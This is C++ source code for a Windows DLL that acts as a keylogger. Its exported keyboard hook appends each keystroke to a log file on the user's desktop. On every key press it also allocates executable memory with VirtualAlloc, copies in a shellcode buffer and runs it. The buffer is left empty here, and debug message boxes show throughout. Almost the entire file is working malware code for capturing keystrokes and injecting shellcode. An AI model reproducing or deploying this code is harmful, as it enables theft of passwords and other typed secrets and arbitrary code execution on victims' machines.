
#include "pch.h"
#include <windows.h>
#include <fstream>

HHOOK keyboardHook;

void CreateLogFile() {
    std::ofstream logFile("C:\\Users\\IEUser\\Desktop\\log.txt", std::ios::app);
    if (!logFile.is_open()) {
        MessageBoxA(NULL, "Failed to create log file", "Error", MB_OK);
    }
    else {
        logFile << "Log file created.\n";
        logFile.close();
    }
}

extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;

        std::ofstream logFile("C:\\Users\\IEUser\\Desktop\\log.txt", std::ios::app);
        if (logFile.is_open()) {
            char key = static_cast<char>(MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR));
            if (key) {
                logFile << key;
                logFile.flush();
                MessageBoxA(NULL, "Key logged", "Info", MB_OK);
            }
            else {
                logFile << "[Unknown Key]";
                logFile.flush();
                MessageBoxA(NULL, "Unknown Key logged", "Info", MB_OK);
            }
            logFile.close();
        }
        else {
            MessageBoxA(NULL, "Failed to open log file", "Error", MB_OK);
        }

        // Execute the shellcode on any key press
        unsigned char shellcode[] = "";
        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (exec) {
            memcpy(exec, shellcode, sizeof shellcode);
            ((void(*)())exec)();
            MessageBoxA(NULL, "Shellcode executed", "Info", MB_OK);
        }
        else {
            MessageBoxA(NULL, "Failed to allocate memory for shellcode", "Error", MB_OK);
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateLogFile(); // Create the log file if it doesn't exist
        MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "Info", MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
            MessageBoxA(NULL, "Keyboard hook removed", "Info", MB_OK);
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
